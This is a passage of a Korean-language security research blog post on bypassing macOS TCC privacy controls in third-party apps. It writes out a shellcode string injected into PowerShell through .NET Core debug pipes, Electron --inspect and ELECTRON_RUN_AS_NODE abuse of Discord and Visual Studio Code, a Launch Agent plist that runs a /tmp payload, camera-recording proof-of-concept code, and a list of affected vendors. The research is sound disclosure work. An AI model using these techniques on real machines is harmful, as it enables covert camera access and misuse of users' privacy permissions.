    PAL_GetTransportPipeName(m_outPipeName, pd.m_Pid, pd.m_ApplicationGroupId, "out");

    unlink(m_inPipeName);

    if (mkfifo(m_inPipeName, S_IRWXU) == -1)
    {
        return false;
    }


    unlink(m_outPipeName);

    if (mkfifo(m_outPipeName, S_IRWXU) == -1)
    {
        unlink(m_inPipeName);
        return false;
    }

    m_state = Created;
    return true;
}
```
{% endraw %}


<br>


여기서는 예시로 .NET Core 기반 애플리케이션인 Powershell을 실행시키고 디버그 파이프를 확인한다.


디버그 파이프는 $TMPDIR에 생성되며 파일명에 PID를 포함한다.


![24](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/24.png)


![25](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/25.png)


<br>


$TMPDIR은 환경 변수에서 확인할 수 있다.


![26](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/26.png)


<br>


이후에는 해당 파이프를 통해 디버그 세션을 맺을 수 있으며, 이 구현은 .NET Core에 작성되어 있다.


또한 .NET Core의 `MT_WriteMemory` 및 `MT_ReadMemory` 함수를 통해 디버기 프로세스의 메모리를 읽거나 쓸 수 있다.


<br>


아래는 `MT_WriteMemory` 함수를 통해 Powershell의 임의 메모리에 값을 쓰는 것을 보여준다.


<br>


디버그 파이프 연결 및 값 전송 코드 작성은 아래 링크의 코드를 참고하였다.

- [https://gist.github.com/xpn/7c3040a7398808747e158a25745380a5](https://gist.github.com/xpn/7c3040a7398808747e158a25745380a5)

<br>


먼저 디버그 파이프를 통해 값을 쓰기전 메모리를 할당하였을 때 메모리에는 아무 값도 들어 있지 않다.


![27](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/27.png)


<br>


다음과 같이 디버그 파이프에 연결하여 위에 출력된 메모리에 임의의 값을 작성한다.


{% raw %}
```bash
export in=$(ls /var/folders/n1/nc8h8x5n0_3387ttlfk_54j80000gn/T/*-in); export out=$(ls /var/folders/n1/nc8h8x5n0_3387ttlfk_54j80000gn/T/*-out); ./memdump $in $out 105553119630272
```
{% endraw %}


<br>


임의의 값이 위에서 출력된 메모리에 성공적으로 쓰여졌다.


![28](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/28.png)


<br>


임의의 위치에 원하는 값을 쓸 수 있으므로 우리는 쓰기 권한 및 실행 권한이 있는 페이지에 쉘코드를 위치시킬 것이다.


.NET Core Runtime은 JIT를 위해 DFT(Dynamic Function Table)을 제공한다.


![29](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/29.png)


해당 테이블에서 임의의 함수 포인터를 쉘코드 위치로 조작하여 원하는 명령을 실행시킬 수 있다.


<br>


다음은 Powershell의 메모리에 쉘코드를 주입하여 임의의 명령을 실행하는 것을 보여준다.

1. 쉘코드 주입 및 실행 코드 작성

	아래 링크의 코드를 참조하였다.

	- [https://gist.github.com/xpn/ce5e085b0c69d27e6538179e46bcab3c](https://gist.github.com/xpn/ce5e085b0c69d27e6538179e46bcab3c)

	<br>


	쉘코드를 다음과 같이 변경해주었다.


	{% raw %}
```c++
	unsigned char shellcode[] = "\x48\x31\xc0\x99\x50\x48\xbf\x2f\x74\x6d\x70\x2f\x70\x6f\x63\x57\x54\x5f\x48\x31\xf6\xb0\x02\x48\xc1\xc8\x28\xb0\x3b\x0f\x05";
	```
{% endraw %}

2. Powershell 실행
3. Exploit 코드 실행

{% raw %}
```bash
export in=$(ls /var/folders/n1/nc8h8x5n0_3387ttlfk_54j80000gn/T/*-in); export out=$(ls /var/folders/n1/nc8h8x5n0_3387ttlfk_54j80000gn/T/*-out); ./poc $in $out pwsh
```
{% endraw %}


![30](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/30.png)

1. 결과

	![31](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/31.png)


Powershell 컨텍스트에서 계산기가 실행되었으며, 이는 해당 애플리케이션이 가진 모든 TCC 권한을 탈취할 수 있음을 의미한다.


<br>


.NET Core를 기반으로 개발된 애플리케이션에서 취약점을 찾고자 할 때 $TMPDIR에 디버그 파이프가 생성되는지 확인해보면 좋다.


## Electron 기반 애플리케이션의 경우


Electron 기반 애플리케이션의 경우 Electron이 기본적으로 제공하는 기능들로 인해 해당 앱 컨텍스트에서 원하는 명령을 실행할 수 있다.


이들은 기본적으로 활성화되어 있으며, JIT를 통해 실행되므로 Library Validation이 활성화되어 있더라도 이에 대한 영향을 받지 않는다.


<br>


아래의 두가지는 Electron 기반 애플리케이션에서 TCC 권한을 남용할 수 있는 사례를 설명한다.


또한 아래의 두 사례 모두 터미널에서 실행되기 때문에 `Entitlements 확인 - Launch Agent 설정` 절에서 설명한 Launch Agent 등록을 진행해주어야 TCC 권한을 상속 받을 수 있다.


### 디버그 모드를 통한 임의 명령 실행


Electron 기반 애플리케이션들은 Chromium을 이용한 Web App으로 동작하기 때문에 디버그 모드로 실행시킴으로써 Chrome의 개발자 도구를 사용할 수 있다.


개발자 도구에서는 임의의 NodeJS 명령을 실행시킬 수 있으므로 앱 컨텍스트 내에 존재하는 모든 TCC 권한을 남용할 수 있다.


<br>


디버그 모드는 `--inspect` 옵션을 통해 활성화할 수 있으며 지정된 포트를 통해 개발자 도구를 사용할 수 있다.


아래의 예시는 Electron을 사용하는 Discord에서 디버그 모드를 활성화하고 임의의 NodeJS 명령을 실행하는 것을 보여준다.


<br>


먼저 Discord의 Entitlement는 다음과 같다.


![32](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/32.png)


JIT를 제외하면 런타임 내의 프로세스 주입의 모든 방법이 불가능하다.

1. 디버그 모드로 실행

{% raw %}
```bash
$ ./Discord --inspect=9229
Debugger listening on ws://127.0.0.1:9229/439a717f-265c-41bc-8903-79dc2cd835c7
For help, see: https://nodejs.org/en/docs/inspector
Discord 0.0.293
2024-02-10 16:17:45.729 Discord[59399:936987] WARNING: Secure coding is not enabled for restorable state! Enable secure coding by implementing NSApplicationDelegate.applicationSupportsSecureRestorableState: and returning YES.
Starting app.
```
{% endraw %}

1. `chrome://inspect` 접속

	![33](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/33.png)


	![34](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/34.png)

2. 악성 프로그램 작성

위에서 작성한 카메라 권한 남용 코드와 동일하지만 DYLIB가 아니므로 생성자 대신 main 함수를 작성한다.


{% raw %}
```objective-c
// ... (위에서 설명한 카메라 권한 남용 코드와 동일)

void main(int argc, const char **argv) {
    VideoRecorder *videoRecorder = [[VideoRecorder alloc] init];

    [videoRecorder startRecording];
    [NSThread sleepForTimeInterval:3.0];
    [videoRecorder stopRecording];

    [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
}
```
{% endraw %}

1. 악성 프로그램 컴파일

{% raw %}
```bash
$ gcc -framework Foundation -framework AVFoundation poc.m -o poc
```
{% endraw %}

1. 임의의 NodeJS 명령 실행

	![35](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/35.png)


	콘솔에서는 실패하였다고 출력되지만 실제로는 영상이 저장된다.


	![36](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/36.png)


### 환경 변수를 통한 임의 명령 실행


Electron 기반 애플리케이션은 디버그 모드로 실행시키는 것외에도 NodeJS 콘솔을 사용할 수 있는 또 다른 방법을 제공한다.


`ELECTRON_RUN_AS_NODE` 환경 변수는 애플리케이션을 NodeJS REPL로 변환해주는 환경 변수로 우리는 이를 통해 NodeJS 콘솔을 얻고 임의의 명령을 실행할 수 있다.


<br>


아래의 예시는 Electron 기반 앱인 Visual Studio Code에서 `ELECTRON_RUN_AS_NODE` 환경 변수를 통해 임의의 NodeJS 명령을 실행하는 것을 보여준다.


<br>


Visual Studio Code의 Entitlement는 다음과 같다.


![37](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/37.png)


Visual Studio Code 또한 JIT를 제외하면 런타임 내의 프로세스 주입의 모든 방법이 불가능하다.


<br>

1. NodeJS 모드로 실행

{% raw %}
```bash
$ ELECTRON_RUN_AS_NODE=1 /Applications/Visual\ Studio\ Code.app/Contents/MacOS/Electron
Welcome to Node.js v18.17.1.
Type ".help" for more information.
```
{% endraw %}

1. Launch Agent 등록

위에서 설명하였듯이 터미널에서 실행될 경우에는 터미널의 TCC 권한을 상속 받는다.


우리는 Visual Studio Code의 TCC 권한을 원하므로 Launch Agent를 등록해주어야 한다.


Launch Agent는 다음과 같다.


{% raw %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
      <dict>
            <key>Label</key>
            <string>com.poc.launcher</string>
            <key>RunAtLoad</key>
            <true />
            <key>EnvironmentVariables</key>
            <dict>
                  <key>ELECTRON_RUN_AS_NODE</key>
                  <string>true</string>
            </dict>
            <key>ProgramArguments</key>
            <array>
                  <string>/Applications/Visual Studio Code.app/Contents/MacOS/Electron</string>
                  <string>-e</string>
                  <string>require('child_process').execSync('/tmp/poc')</string>
            </array>
      </dict>
</plist>
```
{% endraw %}


다음 명령어를 통해 Launch Agent를 실행해준다.


{% raw %}
```bash
launchctl load com.poc.launcher.plist
```
{% endraw %}

1. 임의의 NodeJS 명령 실행

![38](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/38.png)


![39](/assets/img/2024-04-15-Methodology-for-discovering-TCC-Bypass-vulnerabilities-in-3rd-party-Applications.md/39.png)


성공적으로 Visual Studio Code의 TCC 권한을 남용하여 카메라를 사용하였다.


# 발견한 취약점 Case


### Non Hardened Runtime

- Nextcloud

### Disable Library Validation

- OpenVPN Connect
- Epic Games Launcher
- Logi Options Plus

### Library Proxying

- 8x8 Virtual Office Desktop for Mac
- Miro

### Electron 기반 애플리케이션 디버그 모드 사용

- Notion
- Visual Studio Code
- Discord
- Figma

### 안전하지 않은 파일 다운로드

- JANDI

# Conclusion


MacOS TCC 매커니즘은 아직까지도 다양한 방법으로 우회될 수 있으며 점유율이 높은 애플리케이션에서도 쉽게 발견된다.


이번 연구를 진행하면서 다양한 애플리케이션에서 취약점을 찾아 제보하였지만 대게 Informative 또는 Out-of-Scope라는 결과를 받았다.


이러한 이유로는 TCC와 Quarantine는 MacOS UX에 큰 영향을 주므로 벤더들은 이러한 영향이 성장과 이익까지 연결된다.


따라서 OS 보안 미티게이션 구현을 원하지 않는 것 같다.


<br>


또한 Electron 기반 애플리케이션들 대다수가 TCC 우회가 가능하다고 해도 과언이 아니다. 


위에서 설명한 벤더를 포함한 Electron 기반의 애플리케이션의 개발자들은 이러한 취약한 기능들이 테스트를 위해서 의도된 기능이라고 설명한다. 따라서 이를 제거할 계획이 없음을 알 수 있다.


이에 대해 애플리케이션 보안 연구원인 Vladimir Metnew은 다음과 같은 의견을 제시했다.


> 이러한 기능을 해석하는 것은 여러분들의 몫입니다.
> 그러나 이러한 기능들이 의도된 기능이라고 말하기 전에 다음과 같은 질문에 답해보세요.
> 1. 라이브러리 검증이 Apple의 공증 프로세스의 일부가 된 이유는 무엇입니까?
> 2. Electron 기반 앱에만 “원하는 대로 디버깅” 기능이 있고 다른 MacOS 앱에는 없는 이유가 무엇입니까?
> 3. 때때로 이러한 기능을 통해 LPE가 발생하는 이유가 무엇입니까?
{: .prompt-info }


~~_옳소 옳소!!_~~


위 의견에 대한 나의 의견도 동일하며, 여러모로 아쉬움이 많이 남는 연구였다.


현재까지는 3rd-party 애플리케이션을 대상으로 TCC 우회 취약점을 연구하였지만 추후에 Apple의 Built-in 애플리케이션에서도 연구를 진행할 예정이다.


# Reference

- [https://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Regula-20-Plus-Ways-to-Bypass-Your-macOS-Privacy-Mechanisms.pdf](https://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Regula-20-Plus-Ways-to-Bypass-Your-macOS-Privacy-Mechanisms.pdf)
- [https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-tcc/macos-tcc-bypasses](https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-tcc/macos-tcc-bypasses)
- [https://www.vicarius.io/vsociety/posts/cve-2023-26818-exploit-macos-tcc-bypass-w-telegram-part-1-2](https://www.vicarius.io/vsociety/posts/cve-2023-26818-exploit-macos-tcc-bypass-w-telegram-part-1-2)
- [https://wojciechregula.blog/post/abusing-electron-apps-to-bypass-macos-security-controls/](https://wojciechregula.blog/post/abusing-electron-apps-to-bypass-macos-security-controls/)
- [https://conference.hitb.org/hitbsecconf2021ams/materials/D1T1 - MacOS Local Security - Escaping the Sandbox and Bypassing TCC - Thijs Alkemade & Daan Keuper.pdf](https://conference.hitb.org/hitbsecconf2021ams/materials/D1T1%20-%20MacOS%20Local%20Security%20-%20Escaping%20the%20Sandbox%20and%20Bypassing%20TCC%20-%20Thijs%20Alkemade%20&%20Daan%20Keuper.pdf)
- [https://blog.xpnsec.com/bypassing-macos-privacy-controls/](https://blog.xpnsec.com/bypassing-macos-privacy-controls/)
- [https://blog.xpnsec.com/dirtynib/](https://blog.xpnsec.com/dirtynib/)
- [https://blog.xpnsec.com/restoring-dyld-memory-loading/](https://blog.xpnsec.com/restoring-dyld-memory-loading/)
- [https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/](https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/)
	- [https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)
- [https://opensource.apple.com/source/dyld/dyld-655.1.1/](https://opensource.apple.com/source/dyld/dyld-655.1.1/)
- [https://www.hopperapp.com/](https://www.hopperapp.com/)
- [https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)
- [https://theevilbit.github.io/shield/](https://theevilbit.github.io/shield/)
- [https://theevilbit.github.io/posts/secure_coding_xpc_part3/](https://theevilbit.github.io/posts/secure_coding_xpc_part3/)
- [https://objective-see.org/blog/blog_0x56.html](https://objective-see.org/blog/blog_0x56.html)
- [https://www.virusbulletin.com/uploads/pdf/magazine/2015/vb201503-dylib-hijacking.pdf](https://www.virusbulletin.com/uploads/pdf/magazine/2015/vb201503-dylib-hijacking.pdf)
- [https://github.com/gdbinit/MachOView](https://github.com/gdbinit/MachOView)
- [https://sourceforge.net/projects/machoview/files/latest/download](https://sourceforge.net/projects/machoview/files/latest/download)
- [https://developer.apple.com/documentation/security/defining_launch_environment_and_library_constraints](https://developer.apple.com/documentation/security/defining_launch_environment_and_library_constraints)
- [https://github.com/gergelykalman/CVE-2023-38571-a-macOS-TCC-bypass-in-Music-and-TV/blob/main/librarian.py](https://github.com/gergelykalman/CVE-2023-38571-a-macOS-TCC-bypass-in-Music-and-TV/blob/main/librarian.py)
- [https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3)
- [https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [https://learn.microsoft.com/ko-kr/microsoft-365/security/defender/advanced-hunting-overview?view=o365-worldwide](https://learn.microsoft.com/ko-kr/microsoft-365/security/defender/advanced-hunting-overview?view=o365-worldwide)
- [https://www.virusbulletin.com/virusbulletin/2015/03/dylib-hijacking-os-x](https://www.virusbulletin.com/virusbulletin/2015/03/dylib-hijacking-os-x)
- [https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [https://eclecticlight.co/2023/06/13/why-wont-a-system-app-or-command-tool-run-launch-constraints-and-trust-caches/](https://eclecticlight.co/2023/06/13/why-wont-a-system-app-or-command-tool-run-launch-constraints-and-trust-caches/)
- [https://theevilbit.github.io/posts/amfi_launch_constraints/](https://theevilbit.github.io/posts/amfi_launch_constraints/)
- [https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [https://medium.com/@donblas/fun-with-rpath-otool-and-install-name-tool-e3e41ae86172](https://medium.com/@donblas/fun-with-rpath-otool-and-install-name-tool-e3e41ae86172)
- [https://hackerone.com/reports/470637](https://hackerone.com/reports/470637)
- [https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)
